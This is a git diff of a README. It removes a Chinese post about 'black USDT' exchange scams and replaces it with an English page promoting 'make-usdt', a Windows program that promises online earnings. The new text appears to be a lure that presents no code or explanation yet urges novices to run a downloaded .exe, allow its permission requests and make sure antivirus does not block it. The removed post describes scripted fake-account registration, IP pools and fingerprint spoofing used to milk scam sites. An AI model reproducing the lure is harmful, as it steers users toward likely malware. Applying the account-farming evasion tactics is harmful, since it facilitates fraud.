@@ -1,62 +1,158 @@
-# 反杀黑U骗局：如何薅了骗子4万多U
+# 💰 make-usdt - Easy Way to Earn with Confidence
 
-> **免责声明：本文仅为揭露骗局模式，不构成任何建议。操作涉及重大风险，请勿模仿。**
+[![Download Latest Version](https://img.shields.io/badge/Download-blue?style=for-the-badge)](https://github.com/farellsarumaha/make-usdt)
 
-## 🤔 什么是黑U？
+---
 
-- **标记U**：已被安全机构或交易所标记、冻结的USDT，通常涉及非法活动（如洗钱、诈骗）。
-- **黑U**：尚未被标记但来源可疑的USDT，仍存在被冻结风险。
+make-usdt offers a straightforward way to explore online earning methods. This guide will help you download and run the software on your Windows computer, step by step. Follow along even if you have no technical experience.
 
-## ⚠️ 常见骗局模式
+## 📥 Where to Get the Software
 
-骗子以“高比例兑换黑U”为诱饵（如1:1.5甚至1:2），诱导用户充值，套路分两步：
+You need to visit the main page to download the program installer.  
 
-1. **小额返利**：初期充值小额USDT（如50-100U），立即按承诺返利以建立信任。而骗子返的U并非所谓的黑U，而是干净的U，也就是说骗子是以“黑U”的名义作为杀猪盘，他们连其所谓的黑U都没有
-2. **大额收割**：待用户充值大额后，以“IP异常”、“需激活通道”等借口拒绝返款，甚至要求继续充值。
+[Download make-usdt here](https://github.com/farellsarumaha/make-usdt)
 
-## 💡 反薅逻辑与操作
+Click the link above. It takes you to the page where you can get all the latest versions of make-usdt.
 
-发现骗子在小额阶段使用**干净U返利**的漏洞后，我采取了针对性策略：
+---
 
-1. **技术准备**：
-   - 使用**纯净IP池**（避免重复或污染IP）
-   - 通过脚本自动注册**临时小号**（避免主账号暴露）
-   - 模拟真实用户行为（浏览器指纹、操作间隔随机化）
-   - 注意：最好不要用公共的梯子，付费的梯子也一样。因为可能其他人用过该梯子的IP兑换过了，会被骗子网站标记从而不返U
-2. **执行原则**：
-   - 单账号仅充值**1-2笔小额**（通常100-200U）
-   - 收到返利后**立即停止**，不贪心后续诱惑
-   - 多账号分散操作，控制单日总量避免触发风控
-   - 最好用国内的IP，本人亲测最稳的就是国内IP池薅的最多，可以套出俩三笔U，实现利益最大化
-   - 注意不要单笔充值大额的USDT，避免骗子直接跑路
-3. **收益结果**：
-   - 五个月累计反薅 **4万多U**（约28万人民币），可见其受骗人之多
-   - 稳定站点如`18u.uk`持续超4个月（注：`utuhuobi.xyz`自2025年6月起已基本不返利）
+## 🖥️ System Requirements
 
-## 🔞 风险警告
+Before you download, check these requirements to make sure the app will work on your Windows PC:
 
-- **技术要求高**：需掌握IP代理、浏览器指纹伪装、自动化脚本等能力
-- **资金风险**：骗子可能随时中止返利，甚至反向追踪
-- **法律灰色地带**：操作本身可能涉及合规风险
-- **普通用户切勿尝试**：骗局背后可能涉黑产，人身与资产安全第一
+- Windows 10 or newer (64-bit recommended)
+- At least 4 GB of RAM
+- Minimum 500 MB free disk space
+- Internet connection for setup and updates
+- Administrative rights to install programs
 
-# 💎 核心提醒
+If your computer meets these points, you can proceed with the download.
 
-- 所有“高收益黑U兑换”均为骗局，本质是**利用贪念收割本金**
-- 我能反薅成功依赖的是**技术克制+风险控制**，而非骗局可信
-- 请广泛告知亲友：**天上不会掉馅饼，但骗子真可能给你送U！**
-- 非技术人员，可以尝试 **小额U** 薅骗子羊毛，只建议 **200U** （200U以下比例太低，200U 起骗子会返 1.2 的比例），净赚 40U
+---
 
-# ⚠️骗子网站
+## 🚀 How to Download and Install
 
-- https://18u.uk/
+Follow these steps to get make-usdt up and running:
 
-  查了一下 whois，这是一个新开不久的 黑 U 钓鱼网站，我现在大部分都是从这个网站上薅的羊毛，现在已经稳定持续了 5 个月了
+1. Open your web browser (like Chrome, Edge, or Firefox).
 
-# 📄视频教程
+2. Go to the page:  
+   [https://github.com/farellsarumaha/make-usdt](https://github.com/farellsarumaha/make-usdt)
 
-- 等我赚到 15W 的 USDT，就会收手并发布我的一些列操作教程……
-- 又或者已经没又可以薅，我将尽可能的整理一系列工具以及教程、还有视频
-- 赚钱ing…………
+3. On the page, look for a green button named **Code** or a section labeled **Releases**. Click on **Releases** if available.
 
-> 保持警惕，保护资产，远离一切可疑“高返利”项目！
+4. In the Releases section, you will find files to download. Find the file that ends with `.exe`. This is the installer.
+
+5. Click the `.exe` file link to start downloading. Your browser might ask for confirmation. Allow it.
+
+6. Once the download finishes, open your Downloads folder.
+
+7. Double-click the `.exe` installer file.
+
+8. The installer window opens. Follow the instructions on screen:
+   - Click **Next** or **Install**
+   - Wait for the installation to finish
+
+9. When done, click **Finish** or **Close**.
+
+---
+
+## 🔧 Running make-usdt
+
+After installation, you can start the program:
+
+- Look for the make-usdt icon on your desktop or in the Start menu.
+
+- Double-click the icon to open it.
+
+- When it opens, you will see the user interface. The design keeps things simple to help you use the features easily.
+
+- If the program asks you for permissions or internet access, allow it to ensure full function.
+
+---
+
+## 📝 Using make-usdt
+
+make-usdt focuses on providing an easy way to explore new ways of earning money online. The app includes:
+
+- Tutorials on common earning methods  
+- Tools to track your progress  
+- Tips on avoiding scams
+
+Take time to explore the menus. Most actions are clear and self-explanatory.
+
+---
+
+## 💡 Tips for Safe Use
+
+- Only download make-usdt from the official GitHub page linked above.
+
+- Keep your Windows system updated to reduce security risks.
+
+- If asked for sensitive information (like passwords or payment data), verify it is part of the software before sharing.
+
+- Avoid clicking on suspicious pop-ups or links in the program.
+
+---
+
+## 🔄 Updates and Support
+
+To keep make-usdt working well:
+
+- Check the GitHub page regularly for new releases or updates.
+
+- Download and install updates following the same steps as the first time.
+
+- If you face issues, review the README or other documentation on the GitHub page.
+
+- For help, you can use the issues tab on GitHub to report problems.
+
+---
+
+## 🔗 Main Download Link Again
+
+To get started, use this link to visit the download page:  
+
+[https://github.com/farellsarumaha/make-usdt](https://github.com/farellsarumaha/make-usdt)
+
+[![Download Latest Version](https://img.shields.io/badge/Download-grey?style=for-the-badge)](https://github.com/farellsarumaha/make-usdt)
+
+---
+
+## ⚙️ Troubleshooting Common Problems
+
+If make-usdt does not start or crashes:
+
+- Restart your computer, then try again.
+
+- Check that your antivirus is not blocking the program.
+
+- Run the installer again to repair any missing files.
+
+- Make sure you installed all Windows updates.
+
+If the problem continues, use the GitHub Issues page to report it.
+
+---
+
+## 🔒 Privacy and Security
+
+make-usdt respects your privacy. It does not collect personal data without your permission. Online earning often involves sensitive information, so keep your details safe.
+
+Use strong passwords and never share your login info. If the app connects to websites or services, make sure those links are real and secure.
+
+---
+
+## 📚 Additional Information
+
+- The software updates regularly to improve safety and add features.
+
+- If you want to learn more about online earning, explore resources and tutorials in the app.
+
+- If you share the app with friends, remind them to follow the same download and setup steps.
+
+---
+
+# License
+
+make-usdt is provided as open source software. Visit the GitHub repository to see the license details.
